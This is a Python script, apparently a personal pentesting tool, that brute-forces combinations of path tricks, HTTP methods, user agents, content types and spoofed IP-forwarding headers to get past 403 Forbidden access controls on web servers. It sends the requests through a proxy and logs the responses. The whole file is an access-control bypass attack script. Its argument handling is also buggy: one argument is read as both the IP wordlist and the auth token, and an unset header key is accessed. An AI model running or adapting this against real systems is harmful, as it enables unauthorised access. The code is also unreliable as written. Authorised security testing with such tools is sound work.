# This file contains the logic of bypassing 403 
'''
Docstring for bypass403
This script is for bypassin 403 forbidden errors on web servers.
The goal is to automate testing all approaches to bypass it including but not limited to:
1. Headers 
2. Path normalization -- done
3. HTTP Methods -- done 
4. User Agents -- done
5. Other headers such as Content-Type -- done 
6. Append IP addresses -- next step
7. Optimize code. -- partially done;
8. ASN/Geo
9. Refererer Headers
10. Test on valid valid scenarios. -- next step.
12. Send them via burp? -- done
13. Tailor the args to be more customizable (e.g., if the user does not want to add these lists);--> next step.
14. Try to conquer it if some of the methods or techniques does not make difference. -- next step.
15. Add auth header and see if it makes difference (403 test instead of 401) -- done
16. Display the request arch (to make sure it is structured correctly). -- next step.
17 leveraging `curl` command to perform requests with different techniques.
'''
import requests
import sys
from payloads import *
from itertools import product


def read_file(file_path):
    with open(file_path, 'r') as file:
        agents = file.readlines()
    return agents


def write_to_file(file_path,response,parms):

    # Parms is a Dic 
    # {"url", "method", "agent", "content_type","header", "ip"}

    with open(file_path, 'a') as file:
        file.write(f"[*] Trying url {parms['modified_url']}, Method {parms['method']} with User-Agent:{parms['agent']} with Content-Type : {parms['content_type']} with header {parms['forwarded_header']} with ip value {parms['ip']}\n")
        if not response.text:
            file.write(f"empty response")
        else:
            file.write(f"Response : {response.text}\n")
        file.write("\n************************************************************\n")


# I cannot make it optional since bypassing depends on passing those parameters
if len(sys.argv) < 4:
    print(f"[!] Incorrect number of arguments.")
    print(f"[!] Usage: {sys.argv[0]} <full_target_url> <agent_wordlist_file> <headers_wordlists> <ip_header_wordlist> <auth token>[optional]")
    sys.exit(1)

agents = read_file(sys.argv[2])
forwarded_headers = read_file(sys.argv[3])
ips = read_file(sys.argv[4])


splited_url = sys.argv[1].split('/')
last_segment= splited_url[-1]

def test_case(method, url, headers, auth=None):
    
    return {
        "method": method,
        "url": url,
        "headers": headers,
        "auth": auth
    }


def generate_test_case():

    for char in PATH_NORM:
        
        if (char == ''):
            modified_url = sys.argv[1]
        else:
            modified_url = '/'.join(splited_url[:-1] + [char] + [last_segment])
        
        print(f"[*] Trying URL: {modified_url}")

        for combination in product(agents, CONTENT_TYPES, forwarded_headers, ips, HTTP_METHODS):
           
            agent, content_type, forwarded_header, ip, method = combination

            headers = {
                "User-Agent": agent.strip(),
                "Content-Type": content_type.strip(),
                "Forwarded_header": forwarded_header.strip(),
                "ip": ip.strip()
            }

            if sys.argv[4]:
                headers["Authorization"] = sys.argv[4].strip()
            
            yield test_case(method.strip(), modified_url, headers=headers)


    print(f"[*] Finished appending results to the file. ")


def send_request():

    for i in generate_test_case():
        
        response = requests.request(i["method"],i["url"], headers={
            "Content-Type": i["headers"]["Content-Type"],
            i["headers"]["Forwarded_header"]:i["headers"]["ip"],
            "User-Agent": i["headers"]["User-Agent"],
            "Authorization":i["headers"]["Authorization"]
        }, proxies=PROXIES, verify=False)

    
        # Update path
        write_to_file("/Users/kholoudahmed/Downloads/Clones/Automation/web/bypass_403/bypass_403_results.txt", response, {
            "modified_url":i["url"],
            "method": i["method"],
            "agent":i["headers"]["User-Agent"],
            "content_type": i["headers"]["Content-Type"],
            "forwarded_header":i["headers"]["Forwarded_header"],
            "ip":i["headers"]["ip"]
        })


send_request()
